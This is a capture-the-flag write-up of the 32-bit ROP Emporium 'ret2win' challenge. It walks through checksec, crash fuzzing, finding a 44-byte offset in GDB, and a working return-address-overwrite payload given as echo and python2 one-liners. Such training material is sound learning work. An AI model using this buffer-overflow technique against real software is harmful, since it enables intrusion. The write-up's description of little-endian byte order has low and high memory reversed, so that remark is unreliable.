# ret2win

This is a simple challenge from ropemporium.com. The objective is to divert the process flow to execute a specific function within the binary to return to.

I will be doing this one with the 32 bit version of the challenge.

## First moves
We can start by examining the file.
We ran two commands that will reveal interesting information to us.

`file`
```bash
└─$ file ret2win32
ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1596c11f85b3ed0881193fe40783e1da685b851, not stripped
```

`checksec`

```bash
[*] '/home/kali/my_challenges/pwn/ropemporium/ret2win/ret2win32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

Most of the protections are disabled except for stack execution. We also see that the binary is 32 bit and is little-endian.

Finally, we will execute the program and observe what it does.
```bash
└─$ ./ret2win32
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

```

Since this is the first challenge, it seems to be already leaking all the info we possibly need haha.

## Attack plan
1. Manually fuzz the program
2. Examine the program dynamically using GDB

### Details
We will start by executing the program again and trying to crash it to gauge how much data we need to input to corrupt the stack.
The program already revealed to us that the buffer its reading the input to is 32 bytes. If we enter exactly 32 bytes:
```bash
└─$ ./ret2win32
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you!

Exiting

```
Ok, it seems to have handled it well. Let's try now to overflow it. It seems to suggest 56 bytes, that's probably the offset to the return value on the stack. Let's try:
```bash
└─$ ./ret2win32
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you!
zsh: segmentation fault (core dumped)  ./ret2win32
```
Yup, it crashed.
We can also confirm this by checking what library functions the binary is calling and looking at their input using `ltrace`.

We will skip static analysis with Ghidra and immediately move to dynamic analysis with GDB.

### Dynamic analysis
Using gdb, we can see three functions of interest in the process
```bash
0x08048546  main
0x080485ad  pwnme
0x0804862c  ret2win
```

Cool, looking at the assembly code of these three functions using GDB, we come to the realization that main calls pwnme and ret2win is never called. ret2win is the function we want to divert the execution to. This will happen when the process tries to return from pwnme to main.

We already know more or less the offset to the return pointer. But we can also double check again by running the program in gdb and using a cyclic pattern to calculate the offset to the return address from the buffer start address.

By crashing the program and checking the EIP for the value that got assigned post return from pwnme we get:
```bash
pwndbg> cyclic -l laaa
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
```

Seems like the start of the return pointer is exactly after 44 bytes. This is enough for us to write an exploit as follows:
```bash
echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x2c\x86\x04\x08" > payload
```
or in python2 if you have it handy:
```bash
python2 -c 'print "a"*44 + "\x2c\x86\x04\x08"' > payload
```

Note that we wrote the return address to ret2win in reverse because the binary is in little-endian mode (i.e, the least significant bits are stored in higher memory values)!

Executing the binary with the payload we get:
```bash
└─$ ./ret2win32 < payload
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
zsh: segmentation fault (core dumped)  ./ret2win32 < payload
```

Success!

